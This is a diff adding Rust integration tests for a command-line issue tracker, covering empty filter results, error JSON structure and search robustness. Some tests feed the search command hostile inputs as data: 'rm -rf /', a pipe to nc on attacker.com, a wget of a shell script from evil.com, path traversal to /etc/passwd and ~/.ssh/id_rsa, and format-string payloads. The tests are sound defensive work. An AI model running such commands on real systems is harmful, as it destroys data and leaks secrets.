@@ -2051,3 +2051,485 @@ fn test_error_with_special_characters_in_stderr() {
     // Cleanup
     fixtures::close_bead(&bead_id, "Special char cleanup");
 }
+
+// ============================================================================
+// Additional empty result edge case tests with filter combinations
+// ============================================================================
+
+#[test]
+fn test_list_json_empty_results_with_multiple_filters() {
+    let _ws = create_isolated_workspace();
+    let workspace = test_workspace();
+
+    // Create beads with specific properties
+    let bead1_id = fixtures::create_bead_with_assignee("High priority bug", "user1@example.com");
+    let bead2_id = fixtures::create_bead("Low priority task");
+
+    // Update priorities
+    capture::capture_stdout(
+        bf_command()
+            .arg("update")
+            .arg(&bead1_id)
+            .arg("--priority")
+            .arg("4")
+    );
+
+    capture::capture_stdout(
+        bf_command()
+            .arg("update")
+            .arg(&bead2_id)
+            .arg("--priority")
+            .arg("1")
+    );
+
+    // Test filter combination that should return no results
+    let output = capture::capture_stdout(
+        bf_command()
+            .arg("list")
+            .arg("--status")
+            .arg("open")
+            .arg("--priority")
+            .arg("3")
+            .arg("--format")
+            .arg("json")
+    );
+
+    // Should return valid JSONL (possibly empty)
+    json_validation::assert_valid_jsonl(&output);
+
+    let trimmed = output.trim();
+    if !trimmed.is_empty() {
+        // If not empty, verify all results match criteria
+        let lines: Vec<&str> = trimmed.lines().filter(|l| !l.trim().is_empty()).collect();
+        for line in lines {
+            let parsed = json_validation::parse_json(line);
+            let status = json_validation::get_string(&parsed, "status");
+            let priority = json_validation::get_int(&parsed, "priority");
+
+            assert_eq!(status, "open", "Status should match filter");
+            assert_eq!(priority, 3, "Priority should match filter");
+        }
+    }
+
+    // Cleanup
+    fixtures::close_bead(&bead1_id, "Filter cleanup 1");
+    fixtures::close_bead(&bead2_id, "Filter cleanup 2");
+}
+
+#[test]
+fn test_search_json_empty_results_with_complex_queries() {
+    let _ws = create_isolated_workspace();
+    let workspace = test_workspace();
+
+    // Create a bead with specific content
+    let bead_id = fixtures::create_bead("Specific content bead");
+
+    capture::capture_stdout(
+        bf_command()
+            .arg("update")
+            .arg(&bead_id)
+            .arg("--description")
+            .arg("This bead contains specific technical content about API endpoints")
+    );
+
+    // Test complex queries that should return no results
+    let complex_queries = vec![
+        "nonexistent term123456",
+        "xyzabc impossible content",
+        "term1 AND term2 AND term3",
+        "phrase that doesn't exist anywhere",
+        "1234567890!@#$%^&*()",
+    ];
+
+    for query in complex_queries {
+        let output = capture::capture_stdout(
+            bf_command()
+                .arg("search")
+                .arg(query)
+                .arg("--format")
+                .arg("json")
+        );
+
+        // Should return valid JSONL (possibly empty)
+        json_validation::assert_valid_jsonl(&output);
+
+        let trimmed = output.trim();
+        if !trimmed.is_empty() {
+            // If not empty, verify results actually match
+            let lines: Vec<&str> = trimmed.lines().filter(|l| !l.trim().is_empty()).collect();
+            assert!(!lines.is_empty(), "If output not empty, should have content");
+        }
+    }
+
+    // Cleanup
+    fixtures::close_bead(&bead_id, "Complex query cleanup");
+}
+
+#[test]
+fn test_ready_json_empty_results_with_specific_conditions() {
+    // Create a truly isolated workspace for this test
+    let temp_dir = create_isolated_workspace();
+    let workspace = temp_dir.path();
+
+    // Create specific conditions where ready should return empty results
+    let bead1_id = fixtures::create_bead("Blocked bead");
+    let bead2_id = fixtures::create_bead("Another blocked bead");
+
+    // Make bead2 depend on bead1
+    fixtures::add_dependency(&bead2_id, &bead1_id);
+
+    // Close bead1 so bead2 becomes blocked
+    fixtures::close_bead(&bead1_id, "Blocker closed");
+
+    // Ready should return no unblocked beads when using the isolated workspace
+    let output = capture::capture_stdout(
+        bf_command_with_workspace(workspace)
+            .arg("ready")
+            .arg("--format")
+            .arg("json")
+    );
+
+    // Should return valid JSONL or empty array
+    let trimmed = output.trim();
+    if !trimmed.is_empty() {
+        // If not empty, validate it's proper JSONL
+        json_validation::assert_valid_jsonl(&output);
+
+        // Check if it's actually empty or just empty array representation
+        let lines: Vec<&str> = trimmed.lines().filter(|l| !l.trim().is_empty()).collect();
+        assert!(lines.is_empty() || (lines.len() == 1 && lines[0] == "[]"),
+               "Ready with blocked beads should return empty or empty array, got: {}", trimmed);
+    }
+
+    // Cleanup
+    fixtures::close_bead(&bead2_id, "Blocked bead cleanup");
+}
+
+// ============================================================================
+// Additional error schema validation tests
+// ============================================================================
+
+#[test]
+fn test_error_json_field_consistency_across_command_types() {
+    let _ws = create_isolated_workspace();
+    let workspace = test_workspace();
+
+    // Test that different error types maintain consistent field presence
+    let error_scenarios = vec![
+        // Show error
+        || {
+            let (stdout, _, _) = capture::capture_failed_command(
+                &mut bf_command()
+                    .arg("show")
+                    .arg("bf-invalid-error-test")
+                    .arg("--format")
+                    .arg("json")
+            );
+            ("show", stdout)
+        },
+        // Update error
+        || {
+            let (stdout, _, _) = capture::capture_failed_command(
+                &mut bf_command()
+                    .arg("update")
+                    .arg("bf-invalid-error-test")
+                    .arg("--description")
+                    .arg("test")
+            );
+            ("update", stdout)
+        },
+        // Comment error
+        || {
+            let (stdout, _, _) = capture::capture_failed_command(
+                &mut bf_command()
+                    .arg("comment")
+                    .arg("bf-invalid-error-test")
+                    .arg("--text")
+                    .arg("test")
+                    .arg("--format")
+                    .arg("json")
+            );
+            ("comment", stdout)
+        },
+    ];
+
+    for scenario in error_scenarios {
+        let (command_name, stdout) = scenario();
+
+        let stdout_trimmed = stdout.trim();
+        if !stdout_trimmed.is_empty() {
+            // If not empty, validate JSON structure
+            json_validation::assert_valid_json(stdout_trimmed);
+
+            let parsed = json_validation::parse_json(stdout_trimmed);
+
+            // Error responses should be consistent in structure
+            // Either empty, an array, or an object with error information
+            if parsed.is_object() {
+                // If object, should have error-related field or be empty
+                let has_error_field = json_validation::has_field(&parsed, "error");
+                let has_data_field = json_validation::has_field(&parsed, "data");
+
+                // At least one of these should be present for object responses
+                assert!(has_error_field || has_data_field || parsed.as_object().map(|o| o.is_empty()).unwrap_or(false),
+                       "{} error response should have error field, data field, or be empty", command_name);
+            }
+        }
+    }
+}
+
+#[test]
+fn test_error_response_with_null_and_missing_fields() {
+    let _ws = create_isolated_workspace();
+    let workspace = test_workspace();
+
+    // Test that error responses handle null and missing fields correctly
+    let bead_id = fixtures::create_bead("Test bead for null fields");
+
+    // Close the bead to create error conditions
+    fixtures::close_bead(&bead_id, "Setup for null field test");
+
+    // Try operations on closed bead
+    let (stdout, stderr, success) = capture::capture_failed_command(
+        &mut bf_command()
+            .arg("update")
+            .arg(&bead_id)
+            .arg("--description")
+            .arg("Should not work")
+    );
+
+    // Verify error handling
+    if !success {
+        assert!(!stderr.is_empty(), "Error should be in stderr");
+
+        // Stdout should be empty or valid JSON
+        let stdout_trimmed = stdout.trim();
+        if !stdout_trimmed.is_empty() {
+            json_validation::assert_valid_json(stdout_trimmed);
+
+            // If JSON is returned, validate structure
+            let parsed = json_validation::parse_json(stdout_trimmed);
+
+            // Should handle null fields gracefully
+            if parsed.is_object() {
+                // Check for proper null handling in optional fields
+                if let Some(obj) = parsed.as_object() {
+                    for (key, value) in obj {
+                        // All values should be proper JSON types (including null)
+                        assert!(value.is_string() || value.is_number() || value.as_bool().is_some() ||
+                               value.is_null() || value.is_array() || value.is_object(),
+                               "Field '{}' should be valid JSON type, got: {:?}", key, value);
+                    }
+                }
+            }
+        }
+    }
+}
+
+// ============================================================================
+// Additional invalid query and input edge cases
+// ============================================================================
+
+#[test]
+fn test_search_json_with_path_traversal_attempts() {
+    let _ws = create_isolated_workspace();
+    let workspace = test_workspace();
+
+    let bead_id = fixtures::create_bead("Path traversal test bead");
+
+    // Test various path traversal attempts
+    let path_traversal_queries = vec![
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32",
+        "/etc/passwd",
+        "C:\\Windows\\System32\\config\\sam",
+        "./../../",
+        "~/.ssh/id_rsa",
+        "/proc/version",
+        "C:\\boot.ini",
+        "\\\\.\\pipe\\",
+        "....//....//....//etc/passwd",
+        "..%2F..%2F..%2Fetc%2Fpasswd",
+        "%2e%2e%2fetc%2fpasswd",
+    ];
+
+    for query in path_traversal_queries {
+        let output = capture::capture_stdout(
+            bf_command()
+                .arg("search")
+                .arg(query)
+                .arg("--format")
+                .arg("json")
+        );
+
+        // Should return valid JSONL without crashing
+        json_validation::assert_valid_jsonl(&output);
+    }
+
+    // Cleanup
+    fixtures::close_bead(&bead_id, "Path traversal cleanup");
+}
+
+#[test]
+fn test_search_json_with_command_injection_attempts() {
+    let _ws = create_isolated_workspace();
+    let workspace = test_workspace();
+
+    let bead_id = fixtures::create_bead("Command injection test bead");
+
+    // Test command injection patterns
+    let injection_queries = vec![
+        "test; rm -rf /",
+        "test && cat /etc/passwd",
+        "test | nc attacker.com 4444",
+        "test; wget http://evil.com/shell.sh",
+        "test || ping localhost",
+        "test & background_process",
+        "test; exit",
+        "$(malicious_command)",
+        "`malicious_command`",
+        "test # comment with malicious content",
+        "test; DROP TABLE beads; --",
+    ];
+
+    for query in injection_queries {
+        let output = capture::capture_stdout(
+            bf_command()
+                .arg("search")
+                .arg(query)
+                .arg("--format")
+                .arg("json")
+        );
+
+        // Should return valid JSONL and not execute commands
+        json_validation::assert_valid_jsonl(&output);
+    }
+
+    // Cleanup
+    fixtures::close_bead(&bead_id, "Command injection cleanup");
+}
+
+#[test]
+fn test_search_json_with_format_string_attempts() {
+    let _ws = create_isolated_workspace();
+    let workspace = test_workspace();
+
+    let bead_id = fixtures::create_bead("Format string test bead");
+
+    // Test format string vulnerability patterns
+    let format_string_queries = vec![
+        "%s%s%s%s%s",
+        "%n%n%n%n%n",
+        "%x%x%x%x%x",
+        "%p%p%p%p%p",
+        "%d%d%d%d%d",
+        "test %s %s %s",
+        "%999999999999s",
+        "%99999999999c%99999999999c",
+        "%.999999999999f",
+        "%0p",
+        "%999999s",
+        "AAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+    ];
+
+    for query in format_string_queries {
+        let output = capture::capture_stdout(
+            bf_command()
+                .arg("search")
+                .arg(query)
+                .arg("--format")
+                .arg("json")
+        );
+
+        // Should return valid JSONL and not crash
+        json_validation::assert_valid_jsonl(&output);
+    }
+
+    // Cleanup
+    fixtures::close_bead(&bead_id, "Format string cleanup");
+}
+
+#[test]
+fn test_list_json_with_all_filter_combinations_empty() {
+    let _ws = create_isolated_workspace();
+    let workspace = test_workspace();
+
+    // Create beads with known properties
+    let bead1_id = fixtures::create_bead_with_assignee("Test bead 1", "user1@example.com");
+    let bead2_id = fixtures::create_bead("Test bead 2");
+
+    // Set specific properties
+    capture::capture_stdout(
+        bf_command()
+            .arg("update")
+            .arg(&bead1_id)
+            .arg("--priority")
+            .arg("3")
+    );
+
+    capture::capture_stdout(
+        bf_command()
+            .arg("update")
+            .arg(&bead2_id)
+            .arg("--priority")
+            .arg("2")
+    );
+
+    // Test filter combinations that should return empty results
+    // Test 1: Status that doesn't match any bead
+    let output1 = capture::capture_stdout(
+        bf_command()
+            .arg("list")
+            .arg("--status")
+            .arg("blocked")
+            .arg("--format")
+            .arg("json")
+    );
+    json_validation::assert_valid_jsonl(&output1);
+    let trimmed1 = output1.trim();
+    if !trimmed1.is_empty() {
+        let lines: Vec<&str> = trimmed1.lines().filter(|l| !l.trim().is_empty()).collect();
+        assert!(lines.is_empty() || json_validation::get_string(&json_validation::parse_json(lines[0]), "status") == "blocked",
+               "Results should match blocked status filter");
+    }
+
+    // Test 2: Type that doesn't exist
+    let output2 = capture::capture_stdout(
+        bf_command()
+            .arg("list")
+            .arg("--type")
+            .arg("nonexistent-type")
+            .arg("--format")
+            .arg("json")
+    );
+    json_validation::assert_valid_jsonl(&output2);
+    assert!(output2.trim().is_empty() || output2.trim() == "[]", "Nonexistent type should return empty");
+
+    // Test 3: Priority that doesn't match any bead
+    let output3 = capture::capture_stdout(
+        bf_command()
+            .arg("list")
+            .arg("--priority")
+            .arg("999")
+            .arg("--format")
+            .arg("json")
+    );
+    json_validation::assert_valid_jsonl(&output3);
+    assert!(output3.trim().is_empty() || output3.trim() == "[]", "Non-matching priority should return empty");
+
+    // Test 4: Assignee that doesn't exist
+    let output4 = capture::capture_stdout(
+        bf_command()
+            .arg("list")
+            .arg("--assignee")
+            .arg("nonexistent@example.com")
+            .arg("--format")
+            .arg("json")
+    );
+    json_validation::assert_valid_jsonl(&output4);
+    assert!(output4.trim().is_empty() || output4.trim() == "[]", "Nonexistent assignee should return empty");
+
+    // Cleanup
+    fixtures::close_bead(&bead1_id, "Filter combination cleanup 1");
+    fixtures::close_bead(&bead2_id, "Filter combination cleanup 2");
+}
